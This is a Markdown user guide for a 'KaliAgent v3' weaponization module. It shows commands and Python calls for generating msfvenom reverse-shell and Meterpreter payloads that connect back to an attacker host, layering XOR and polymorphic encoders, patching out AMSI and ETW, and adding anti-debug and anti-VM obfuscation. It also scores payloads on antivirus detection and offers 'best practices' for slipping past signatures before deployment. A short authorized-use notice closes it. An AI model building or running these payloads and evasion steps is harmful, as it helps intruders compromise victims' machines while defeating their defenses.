# KaliAgent v3 - Weaponization Guide

## Overview

The Weaponization module provides comprehensive payload generation, encoding, evasion, and testing capabilities.

**Components:**
- **Payload Generator** - MSFVenom integration with multi-platform support
- **Payload Encoder** - 9 encoders + AMSI/ETW evasion
- **Testing Framework** - 8 test types with risk scoring
- **Weaponization Engine** - End-to-end orchestration
- **AV Signature Database** - 23+ signatures for evasion testing

---

## Quick Start

### Generate a Simple Payload

```bash
cd /home/user/agentic-ai/agentic_ai/kali_agent_v3/weaponization

# Generate Windows reverse TCP payload
python3 payload_generator.py --lhost 192.0.2.100 --lport 4444 \
  --type reverse_tcp --format exe --platform windows
```

### Encode a Payload

```bash
# Encode with XOR dynamic
python3 encoder.py --encode payload.exe --encoder xor_dynamic

# Encode with Base64
python3 encoder.py --encode payload.exe --encoder base64 --iterations 2
```

### Apply AMSI/ETW Patches

```bash
# Patch PowerShell script
python3 encoder.py --amsi script.ps1

# Patch ETW
python3 encoder.py --etw payload.ps1

# Add obfuscation
python3 encoder.py --obfuscate script.ps1
```

### Test a Payload

```bash
# Run all tests
python3 testing_framework.py --test payload.exe

# Run specific tests
python3 testing_framework.py --test payload.exe --tests size_check hash_verification signature_check
```

### Full Weaponization Pipeline

```bash
# Quick weaponization (generate → encode → test)
python3 weaponization_engine.py --quick \
  --name my_payload \
  --lhost 192.0.2.100 \
  --lport 4444 \
  --platform windows
```

---

## Payload Generator

### Supported Platforms

| Platform | Formats | Architectures |
|----------|---------|---------------|
| Windows | exe, dll, msi, hta, js, vbs, bat, ps1 | x86, x64 |
| Linux | elf, so | x86, x64, arm, arm64 |
| macOS | macho, app | x64, arm64 |
| Android | apk | arm, arm64 |
| Web | war, jsp, php, asp, aspx | x64 |

### Payload Types

- `reverse_tcp` - Standard reverse TCP
- `reverse_http` - HTTP reverse shell
- `reverse_https` - HTTPS reverse shell (encrypted)
- `reverse_websocket` - WebSocket reverse shell
- `bind_tcp` - Bind shell (listen on target)
- `meterpreter` - Metasploit Meterpreter

### Example: Multi-Platform Generation

```python
from payload_generator import PayloadGenerator, Platform, PayloadType, PayloadFormat

generator = PayloadGenerator()

# Generate for multiple platforms
platforms = [Platform.WINDOWS, Platform.LINUX, Platform.ANDROID]
results = generator.generate_multi_platform(
    name='multi_payload',
    lhost='192.0.2.100',
    lport=4444,
    platforms=platforms
)

for platform, result in results.items():
    if result.success:
        print(f"✅ {platform}: {result.payload_path}")
    else:
        print(f"❌ {platform}: {result.error}")
```

---

## Payload Encoder

### Available Encoders

| Encoder | Expansion | Detection Evasion | Use Case |
|---------|-----------|-------------------|----------|
| `base64` | 1.33x | Low | Simple obfuscation |
| `base32` | 1.6x | Low | ASCII-safe encoding |
| `hex` | 2x | Low | Hex representation |
| `xor` | 1x | Medium | Static key XOR |
| `xor_dynamic` | 1x + 4 bytes | Medium-High | Dynamic key XOR |
| `shikata_ga_nai` | Variable | High | Polymorphic (Metasploit) |
| `alphanumeric` | Variable | High | ASCII-only payload |
| `call4_d` | Variable | High | Call+4 decoder |
| `fenster` | Variable | High | Fenster decoder |

### Example: Custom XOR Key

```python
from encoder import PayloadEncoder

encoder = PayloadEncoder()

# Encode with custom XOR key
result = encoder.encode(
    input_path=Path('payload.exe'),
    encoder='xor',
    xor_key=b'\xDE\xAD\xBE\xEF',  # Custom 4-byte key
    iterations=3
)

print(f"Encoded: {result.encoded_path}")
print(f"Decoder: {result.decoder_stub}")
```

### AMSI/ETW Evasion

```python
from encoder import PayloadEncoder

encoder = PayloadEncoder()

# Patch AMSI (PowerShell)
success, msg = encoder.patch_amsi(Path('script.ps1'))

# Patch ETW
success, msg = encoder.patch_etw(Path('payload.exe'))

# Apply multiple obfuscation techniques
techniques = [
    'string_encryption',
    'dead_code',
    'anti_debug',
    'anti_vm'
]

success, msg = encoder.add_obfuscation(
    input_path=Path('payload.ps1'),
    techniques=techniques
)
```

---

## Testing Framework

### Test Types

| Test | Purpose | Pass Criteria |
|------|---------|---------------|
| `size_check` | Verify payload size | 100 bytes - 500 MB |
| `hash_verification` | Calculate MD5/SHA256 | Always passes |
| `signature_check` | AV signature detection | No matches |
| `execution` | File type validation | Valid header |
| `connectivity` | LHOST/LPORT check | Configured correctly |
| `av_evasion` | Suspicious string check | No obvious strings |
| `sandbox_detection` | VM/Debugger checks | Contains detection |
| `functional` | Syntax validation | Valid syntax |

### Example: Run Tests

```python
from testing_framework import PayloadTester, TestType

tester = PayloadTester()

# Run all tests
report = tester.test_payload(Path('payload.exe'))

print(f"Status: {report.overall_status}")
print(f"Passed: {report.passed}/{report.total_tests}")
print(f"Risk Score: {report.risk_score:.1f}/10")

# Run specific tests
report = tester.test_payload(
    Path('payload.exe'),
    test_types=[
        TestType.SIZE_CHECK,
        TestType.SIGNATURE_CHECK,
        TestType.AV_EVASION
    ]
)
```

### Risk Score Interpretation

| Score | Status | Recommendation |
|-------|--------|----------------|
| 0-2 | ✅ Excellent | Ready for deployment |
| 3-5 | ⚠️ Good | Minor improvements needed |
| 6-8 | ⚠️ Fair | Additional encoding recommended |
| 9-10 | ❌ Poor | Re-generate with different settings |

---

## Weaponization Engine

### Quick Weaponize

```python
from weaponization_engine import WeaponizationEngine
from payload_generator import Platform

engine = WeaponizationEngine()

# Quick weaponization with defaults
report = engine.quick_weaponize(
    name='my_payload',
    lhost='192.0.2.100',
    lport=4444,
    platform=Platform.WINDOWS
)

print(f"Success: {report.success}")
print(f"Final Payload: {report.final_payload_path}")
print(f"Stages: {', '.join(report.stages_completed)}")
print(f"Time: {report.total_time_seconds:.1f}s")
```

### Custom Job Configuration

```python
from weaponization_engine import WeaponizationEngine
from payload_generator import Platform, Architecture
from encoder import EncoderType, ObfuscationTechnique

engine = WeaponizationEngine()

# Create custom job
job = engine.create_job(
    name='advanced_payload',
    lhost='192.0.2.100',
    lport=8443,
    platform=Platform.WINDOWS,
    arch=Architecture.X64,
    encode=True,
    encoder=EncoderType.XOR_DYNAMIC,
    apply_evasion=True,
    evasion_techniques=[
        ObfuscationTechnique.STRING_ENCRYPTION,
        ObfuscationTechnique.CONTROL_FLOW,
        ObfuscationTechnique.ANTI_DEBUG,
        ObfuscationTechnique.ANTI_VM
    ],
    run_tests=True
)

# Execute job
report = engine.execute_job(job)

if report.success:
    print(f"✅ Payload ready: {report.final_payload_path}")
    
    for warning in report.warnings:
        print(f"⚠️  {warning}")
    
    for rec in report.recommendations:
        print(f"💡 {rec}")
```

---

## AV Signature Database

### Scan for Signatures

```python
from av_signatures import AVSignatureDatabase

db = AVSignatureDatabase()

# Scan file
with open('payload.exe', 'rb') as f:
    data = f.read()

matches = db.scan_for_signatures(data)

print(f"Found {len(matches)} signatures:")
for sig in matches:
    print(f"  [{sig.severity}] {sig.vendor} - {sig.name}")
    print(f"    Detection: {sig.detection_rate:.1%}")
```

### Search Signatures

```python
# Search by keyword
results = db.search_signatures('mimikatz')

for sig in results:
    print(f"{sig.id}: {sig.name}")
    print(f"  Pattern: {sig.pattern}")
    print(f"  Type: {sig.pattern_type}")
```

### Add Custom Signature

```python
from av_signatures import AVSignature

# Create new signature
sig = AVSignature(
    id='custom_001',
    vendor='Custom',
    name='My.Custom.Signature',
    description='Custom signature for testing',
    pattern='4d79437573746f6d5061747465726e',  # MyCustomPattern
    pattern_type='hex',
    severity='medium',
    category='custom',
    first_seen='2026-04-20',
    last_updated='2026-04-20',
    false_positive_rate=0.01,
    detection_rate=0.95
)

db.add_signature(sig)
```

---

## Best Practices

### 1. Layered Encoding

```python
# Apply multiple encoding layers
encoder = PayloadEncoder()

# First layer: XOR
result1 = encoder.encode(payload_path, 'xor_dynamic')

# Second layer: Base64
result2 = encoder.encode(result1.encoded_path, 'base64')
```

### 2. Evasion Techniques

- **AMSI Bypass** - Always patch for PowerShell payloads
- **ETW Bypass** - Prevent event logging
- **String Encryption** - Hide suspicious strings
- **Dead Code** - Add noise to confuse signatures
- **Anti-Debug/VM** - Detect analysis environments

### 3. Testing Strategy

1. **Generate** payload with MSFVenom
2. **Encode** with XOR dynamic or polymorphic encoder
3. **Apply** AMSI/ETW patches (PowerShell)
4. **Add** obfuscation techniques
5. **Test** with full test suite
6. **Iterate** if risk score > 5.0

### 4. Signature Avoidance

- Avoid strings: `mimikatz`, `metasploit`, `powershell`, `cmd.exe`
- Use custom templates instead of default executables
- Apply multiple encoding layers
- Test against AV signature database before deployment

---

## Troubleshooting

### msfvenom Not Found

```bash
# Install Metasploit
sudo apt install metasploit-framework

# Or use Docker
docker run --rm -it metasploitframework/metasploit-framework bash
```

### Encoding Failed

- Check input file exists and is readable
- Ensure output directory is writable
- Try different encoder (fallback to XOR dynamic)

### Tests Failing

- **Size check**: Payload too small/large - regenerate
- **Signature check**: Use different encoder/template
- **AV evasion**: Remove suspicious strings
- **Functional**: Fix syntax errors in scripts

---

## API Reference

### PayloadGenerator

```python
generator = PayloadGenerator(output_dir=Path)

# Generate payload
result = generator.generate(config: PayloadConfig) -> PayloadResult

# Generate multi-platform
results = generator.generate_multi_platform(
    name: str,
    lhost: str,
    lport: int,
    platforms: List[Platform]
) -> Dict[str, PayloadResult]

# Create template
success, msg = generator.create_template(
    name: str,
    base_file: Path,
    description: str
)
```

### PayloadEncoder

```python
encoder = PayloadEncoder(output_dir=Path)

# Encode
result = encoder.encode(
    input_path: Path,
    encoder: str,
    xor_key: bytes = None,
    iterations: int = 1
) -> EncodeResult

# Patch AMSI
success, msg = encoder.patch_amsi(input_path: Path)

# Patch ETW
success, msg = encoder.patch_etw(input_path: Path)

# Obfuscate
success, msg = encoder.add_obfuscation(
    input_path: Path,
    techniques: List[str]
)
```

### PayloadTester

```python
tester = PayloadTester(test_dir=Path)

# Test payload
report = tester.test_payload(
    payload_path: Path,
    test_types: List[TestType] = None,
    lhost: str = '127.0.0.1',
    lport: int = 4444
) -> PayloadTestReport
```

### WeaponizationEngine

```python
engine = WeaponizationEngine(output_dir=Path)

# Quick weaponize
report = engine.quick_weaponize(
    name: str,
    lhost: str,
    lport: int,
    platform: Platform
) -> WeaponizationReport

# Create custom job
job = engine.create_job(...)

# Execute job
report = engine.execute_job(job: WeaponizationJob)
```

---

## Security Notice

**⚠️ WARNING:** This tool is for **authorized security testing only**.

- Use only in isolated lab environments
- Obtain proper authorization before testing
- Never deploy against systems you don't own
- Follow all applicable laws and regulations

**Responsible Use:**
- Penetration testing with written authorization
- Security research in controlled environments
- Educational purposes in isolated labs
- Red team exercises with proper scope

---

*Last Updated: April 20, 2026*
*KaliAgent v3 - Phase 2 Complete*
